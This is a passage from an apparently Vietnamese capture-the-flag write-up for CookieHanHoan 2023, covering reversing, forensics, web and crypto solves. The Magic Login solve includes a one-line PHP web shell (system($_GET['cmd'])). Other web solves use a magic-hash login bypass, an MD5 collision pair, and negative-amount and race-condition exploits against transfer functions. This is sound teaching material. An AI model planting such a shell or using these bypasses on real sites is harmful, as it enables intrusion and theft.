    <span class="mh">0x256</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x157</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x181</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x306</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x243</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x373</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1A3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x223</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x200</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x365</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x56</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1B6</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x39C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0FFFE3896</span><span class="p">,</span>
    <span class="mh">0x0A3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2B2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x22D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3D6</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x9A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x76</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2A0</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x63</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x373</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x15</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3B9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x214</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x232</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x225</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x22874</span><span class="p">,</span>
    <span class="mh">0x151</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x153</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x25F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x187</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2AC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1CC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x155</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2F5</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x22D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x17B</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x377</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0B2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x294</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2CE</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0FFFBEC4D</span><span class="p">,</span>
    <span class="mh">0x2AA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x95</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x83</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x25B</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x77</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2E1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x39D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x251</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0A2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x27D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x268</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2F9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x14</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x115</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x3C5E6</span>
<span class="p">]</span>

<span class="k">for</span> <span class="n">equation</span> <span class="ow">in</span> <span class="n">equations</span><span class="p">:</span>
    <span class="n">solver</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">equation</span><span class="p">)</span>

<span class="k">if</span> <span class="n">solver</span><span class="p">.</span><span class="nf">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
    <span class="n">model</span> <span class="o">=</span> <span class="n">solver</span><span class="p">.</span><span class="nf">model</span><span class="p">()</span>
    <span class="n">solution</span> <span class="o">=</span> <span class="p">[</span><span class="n">model</span><span class="p">.</span><span class="nf">evaluate</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="nf">as_long</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">v</span><span class="p">]</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">solution</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">No solution</span><span class="sh">"</span><span class="p">)</span>
    
<span class="n">flag</span> <span class="o">=</span> <span class="sh">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">solution</span><span class="p">:</span>
    <span class="n">flag</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>Key: q20OK36QBiWkZT</strong></p>

<p><img src="/images/cookiehanhoan2023/image-12.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{COOk13_4R3n4}</strong></p>
<h2 id="0x04-forensic">
  
  
    0x04 Forensic <a href="#0x04-forensic">#</a>
  
  
</h2>
    
<h3 id="sổ-đăng-ký">
  
  
    Sổ đăng ký <a href="#sổ-đăng-ký">#</a>
  
  
</h3>
    
<p><strong>Description</strong></p>

<p>Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack.</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1pShye_YtnUuIObPdnq9PeiIge0Oelsix/view?usp=drive_link">Sổ đăng ký</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Bài toán này, chúng ta nhận được file <code class="language-plaintext highlighter-rouge">NTUSER.DAT</code>. Mở file bằng tool <code class="language-plaintext highlighter-rouge">Registry Finder</code>, tìm những từ khóa như <strong>cmd.exe</strong>, <strong>powershell.exe</strong> để xem có thể khai thác được thông tin gì không.</p>

<p>Chúng ta thu được một đoạn shell code khả nghi.</p>

<p><img src="/images/cookiehanhoan2023/image-13.png" alt="Alt text" /></p>

<p>Nhận thấy có mã hóa base64. Chúng ta đem lên <a href="https://gchq.github.io/CyberChef/">CyberChef</a> để giải mã và thu được flag.</p>

<p><img src="/images/cookiehanhoan2023/image-9.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{N0_4_go_n0_st4r_wh3r3}</strong></p>
<h3 id="tin-học-văn-phòng-cơ-bản">
  
  
    Tin học văn phòng cơ bản <a href="#tin-học-văn-phòng-cơ-bản">#</a>
  
  
</h3>
    
<p><strong>Description</strong></p>

<p>Sau khi tham gia một khóa Tin học văn phòng cơ bản, Hòa đã có thể tự tạo một tệp tài liệu độc hại và anh ta có ý định sẽ dùng nó để hack cả thế giới</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1WrLFE5qA-qJ6iLEQYQqCo0Xb99Yz8mTH/view?usp=drive_link">Tin học văn phòng cơ bản</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Chúng ta sử dụng tool <code class="language-plaintext highlighter-rouge">olevba</code> để kiểm tra các macro VBA.</p>

<p><img src="/images/cookiehanhoan2023/image-15.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{If_u_w4nt_1_will_aft3rnull_u}</strong></p>
<h2 id="0x05-web">
  
  
    0x05 Web <a href="#0x05-web">#</a>
  
  
</h2>
    
<h3 id="magic-login">
  
  
    Magic Login <a href="#magic-login">#</a>
  
  
</h3>
    

<p><strong>Description</strong></p>

<p>Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong <code class="language-plaintext highlighter-rouge">/flag.txt</code> hãy tìm cách đọc được chúng.</p>

<p><strong>Format Flag: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p><img src="/images/cookiehanhoan2023/image-14.png" alt="Alt text" /></p>

<p>Để giải quyết bài toán này, <code class="language-plaintext highlighter-rouge">password</code> sau khi hash sha256 phải bằng 0. Những hash này đều có điểm chung là bắt đầu bằng <strong>0e</strong>.</p>

<p>Lên <a href="https://github.com/spaze/hashes/blob/master/sha256.md">https://github.com/spaze/hashes</a>, chọn một password tùy thích.</p>

<p>Đăng nhập với <strong>password = TyNOQHUS</strong>. Đến đây, chúng ta chỉ cần upload shell đơn giản.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p><img src="/images/cookiehanhoan2023/image-16.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{PHP_m4g1c_tr1ck_0lD_but_g0lD_ec3f73ad46f1da5e1f1931a0bb288e0c}</strong></p>
<h3 id="magic-login-harder">
  
  
    Magic Login Harder <a href="#magic-login-harder">#</a>
  
  
</h3>
    

<p><strong>Description</strong></p>

<p>Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong <code class="language-plaintext highlighter-rouge">/flagXXX.txt</code> hãy tìm cách đọc được chúng.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
cp /flag.txt /flag$FLAG.txt
</code></pre></div></div>
<p>Tải challenge: <a href="https://drive.google.com/file/d/1ZSmsdcJ3iFR2KH4aSBQ9z4xlY-z8o-UH">Magic Login Harder</a> (pass: cookiehanhoan)</p>

<p><strong>Format Flag: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"submit"</span><span class="p">])){</span>
        <span class="nv">$username</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]);</span>
        <span class="nv">$password</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]);</span>

        <span class="k">if</span><span class="p">((</span><span class="nv">$username</span> <span class="o">==</span> <span class="nv">$password</span><span class="p">)){</span>
            <span class="k">echo</span> <span class="s1">'Username and password are not the same'</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span><span class="o">===</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">))){</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
            <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: admin.php?file=1.txt'</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'Username and password are wrong'</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Để giải quyết bài toán này, chúng ta phải đi tìm 2 chuỗi <strong>username</strong> và <strong>password</strong> khác nhau nhưng đều có cùng giá trị MD5. Hướng khai thác <strong>MD5 Collision</strong></p>

<p>Chỉ cần lên Google, search một chút về vấn đề này, chúng ta có được kết quả khá ưng ý.</p>

<ul>
  <li><a href="https://stackoverflow.com/questions/1756004/can-two-different-strings-generate-the-same-md5-hash-code">Can two different strings generate the same MD5 hash code?</a></li>
  <li><a href="https://www.mscs.dal.ca/~selinger/md5collision">MD5 Collision Demo</a></li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">base64</span>

<span class="n">x</span> <span class="o">=</span> <span class="sh">'</span><span class="s">4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2</span><span class="sh">'</span>
<span class="n">y</span> <span class="o">=</span> <span class="sh">'</span><span class="s">4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2</span><span class="sh">'</span>

<span class="n">x</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">y</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="n">y</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">md5</span><span class="p">(</span><span class="n">x</span><span class="p">).</span><span class="nf">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">md5</span><span class="p">(</span><span class="n">y</span><span class="p">).</span><span class="nf">hexdigest</span><span class="p">())</span>

<span class="n">x</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">y</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

<span class="c1"># x = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+og==
# y = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+og==
</span></code></pre></div></div>

<p>Login thành công với cặp <strong>(x, y)</strong> thu được ở trên. Sau đó chuyển qua trang <code class="language-plaintext highlighter-rouge">admin.php</code> để xử lý tiếp bài toán.</p>
<h3 id="be-positive">
  
  
    Be Positive <a href="#be-positive">#</a>
  
  
</h3>
    

<p><strong>Description</strong></p>

<p>Libra Dnuf Marketplace</p>

<p>Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob.</p>

<p>After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal.</p>

<p>To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state.</p>

<p><strong>Solution</strong></p>

<p>Từ tên bài toán và là bài web dễ nhất trong đề. Khả năng cao bài toán sẽ có lỗ hổng chuyển tiền âm.</p>

<p>Vào tab <code class="language-plaintext highlighter-rouge">Transfer</code>, chỉnh sửa giá trị <code class="language-plaintext highlighter-rouge">min = -99999</code> rồi chuyển tiền cho Bob với số tiền là <code class="language-plaintext highlighter-rouge">-2000</code>.</p>

<p><img src="/images/cookiehanhoan2023/image-17.png" alt="Alt text" /></p>

<p>Bây giờ, chúng ta đã có dư tiền để mua flag.</p>

<p><img src="/images/cookiehanhoan2023/image-18.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{BE_cAr3fUL_WitH_NE6ATIV3_NumBeR_a2c3d35c666e930911bfb0777e1e93ae}</strong></p>
<h3 id="slow-down">
  
  
    Slow Down <a href="#slow-down">#</a>
  
  
</h3>
    

<p><strong>Description</strong></p>

<p>Libra Dnuf Marketplace</p>

<p>Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob.</p>

<p>After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal.</p>

<p>To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state.</p>

<p><strong>Solution</strong></p>

<p>Ở bài toán này, cấu trúc tương tự như bài <code class="language-plaintext highlighter-rouge">Be Positive</code> nhưng đã bị filter số âm.</p>

<p>Nhận thấy, phản hồi chuyển tiền thành công về khá lâu, cộng thêm tên bài toán là <code class="language-plaintext highlighter-rouge">Slow Down</code>. Từ đấy, mình nghĩ hướng xử lý bài toán liên quan tới <strong>Race Condition</strong>.</p>

<p>Sử dụng 2 trình duyệt khác nhau, cùng login với tài khoản Alice và chuyển tiền đến Bob.</p>

<p><img src="/images/cookiehanhoan2023/image-19.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{ea5y_RaCe_CONd17iOn_e84d1b098a499d032afe243ab64dd49a}</strong></p>
<h2 id="0x06-crypto">
  
  
    0x06 Crypto <a href="#0x06-crypto">#</a>
  
  
</h2>
    
<h3 id="basic-operator">
  
  
    Basic Operator <a href="#basic-operator">#</a>
  
  
</h3>
    

<p><strong>Description</strong></p>

<p>Sử dụng kiến thức toán học và cấu trúc đại số để giải mã flag</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/12t2NfEJISC_TSI0FFjqiHDEQmlGEH195">Basic Operator</a> (pass: cookiehanhoan)</p>

<p><strong>Solution</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">Crypto.Util</span> <span class="kn">import</span> <span class="n">number</span>

<span class="k">def</span> <span class="nf">padding_pkcs7</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">block_size</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
	<span class="n">tmp</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">block_size</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="n">block_size</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span><span class="nf">bytes</span><span class="p">([</span><span class="n">block_size</span><span class="o">-</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">%</span><span class="n">block_size</span><span class="p">)]))</span>

<span class="k">def</span> <span class="nf">split_block</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">block_size</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">list</span><span class="p">(</span><span class="nb">int</span><span class="p">.</span><span class="nf">from_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">block_size</span><span class="p">],</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span><span class="n">block_size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">plus_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">shift</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">+</span><span class="n">shift</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">mul_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">mul</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">*</span><span class="n">mul</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">xor_shift_right_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">bit_loc</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">^</span><span class="p">(</span><span class="n">data</span><span class="o">&gt;&gt;</span><span class="n">bit_loc</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">pow_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">pow</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exp_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">base</span><span class="p">,</span><span class="n">p</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">pow</span><span class="p">(</span><span class="n">base</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">list</span><span class="p">(</span><span class="nf">pow_func</span><span class="p">(</span><span class="nf">exp_func</span><span class="p">(</span><span class="nf">xor_shift_right_func</span><span class="p">(</span><span class="nf">mul_func</span><span class="p">(</span><span class="nf">plus_func</span><span class="p">(</span><span class="n">block</span><span class="p">,</span><span class="mi">3442055609</span><span class="p">),</span><span class="mi">2898124289</span><span class="p">),</span><span class="mi">1</span><span class="p">),</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">),</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="nf">split_block</span><span class="p">(</span><span class="nf">padding_pkcs7</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">4</span><span class="p">),</span><span class="mi">4</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
	<span class="n">p</span> <span class="o">=</span> <span class="mi">1341161101353773850779</span>
	<span class="n">e</span> <span class="o">=</span> <span class="mi">2</span>
	<span class="n">mess</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">CHH{CENSORED}</span><span class="sh">'</span>
	<span class="n">cipher_flag</span> <span class="o">=</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">mess</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="n">cipher_flag</span><span class="p">)</span>
</code></pre></div></div>

<p>Nhận thấy bài toán mã hóa từng block 4 byte một. Vì vậy, chúng ta hoàn toàn có thể brute-force các kí tự để đoán từng block một. 
Để giải quyết bài toán này, chúng ta có hai cách để giải:</p>
<ul>
  <li>Brute-force từng block một như đã phân tích ở trên</li>
  <li>Dựng ngược lại các hàm đã cho để đi tìm flag</li>
</ul>

<p><strong>Cách giải 1.</strong></p>

<p>Nhận thấy rằng <code class="language-plaintext highlighter-rouge">Cipher</code> có 12 block, với 4 chữ cái đầu tiên của flag sẽ là <strong>“CHH{“</strong>. Quan sát kết quả mã hóa block đầu tiên này và so sánh với <code class="language-plaintext highlighter-rouge">Cipher</code>, ta khẳng định được:</p>
<ul>
  <li>Block đầu tiên của flag là <strong>“CHH{“</strong></li>
  <li>Block cuối cùng của flag có 1, 2 hoặc 3 kí tự. Vậy các trường hợp có thể xảy ra là:
    <ul>
      <li>b’}\x03\x03\x03’</li>
      <li>b’x}\x02\x02’</li>
      <li>b’xx}\x01’</li>
    </ul>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
<span class="kn">from</span> <span class="n">string</span> <span class="kn">import</span> <span class="n">printable</span>

<span class="k">def</span> <span class="nf">padding_pkcs7</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">block_size</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
